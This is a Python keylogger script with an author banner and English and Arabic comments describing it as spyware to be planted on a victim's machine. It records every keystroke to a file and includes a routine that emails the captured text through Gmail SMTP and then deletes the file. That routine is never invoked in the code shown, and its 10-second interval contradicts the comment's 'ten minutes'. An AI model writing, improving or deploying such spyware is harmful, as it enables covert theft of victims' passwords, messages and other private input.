from pynput.keyboard import Key , Listener
from threading import Timer
import os 
from smtplib import SMTP

###A keylogger is a spyware program that
#is hidden via e-mail or that you download to the victim's machine and sends everything
#written on the keyboard to the spyware's owner or the sender of the program.
###برنامج التجسس وهو برنامج مخفي يتم إرساله عبر البريد الإلكتروني 
#أو تقوم بتنزيله على جهاز الضحية ويرسل كل شيء مكتوب على لوحة المفاتيح إلى مالك برنامج التجسس أو مرسل البرنامج.


A = '\033[1;10m'
B = '\033[1;36m'
C ='\033[1;30m'
D =('='*40)
print(f"""{A}{D}
<>---<>---<>---<>---<>---<>---<>---<>---<>
        [*]keylogger[*]  
<>---<>---<>---<>---<>---<>---<>---<>---<>        
      >> Naplon ◕_◕ <<
 _   _             _             
| \ | |           | |            
|  \| | __ _ _ __ | | ___  _ __  
| . ` |/ _` | '_ \| |/ _ \| '_ \ 
| |\  | (_| | |_) | | (_) | | | |{B}
|_| \_|\__,_| .__/|_|\___/|_| |_|
            | | instagram: 3h6h                 
            |_| Telegram: naplon0 
<>---<>---<>---<>---<>---<>---<>---<>    
{D}""")   

def key_pressed(key):

    try:
        press = str(key.char)
    except:
        if key == Key.space:
            press = ' '
        else:
            press = str(key)
    
    f = open("keyfile.txt", 'a') #Everything that will be written will be saved in this file #سيتم حفظ كل ما سيتم كتابته في هذا الملف
    f.write(press)
    f.close()

def send_email(email , password , msg):
    mailer = SMTP('smtp.gmail.com',587)
    mailer.starttls()
    mailer.login(email,password)
    mailer.sendmail(email,email,msg)
    mailer.quit()



def timer():
    ti = Timer(10,timer) #The file information will be sent to you via email every ten minutes #سيتم إرسال معلومات الملف إليك عبر البريد الإلكتروني كل عشر دقائق
    ti.start()
    try:
        f = open("keyfile.txt", "r")
        keyfile = f.read()
        send_email("enter gmail ادخل الجيميل","enter password ادخل الباسورد",keyfile) 
        os.remove("keyfile.txt")
    except:
        npthing = ""


with Listener(on_press=key_pressed) as l:
    l.join()

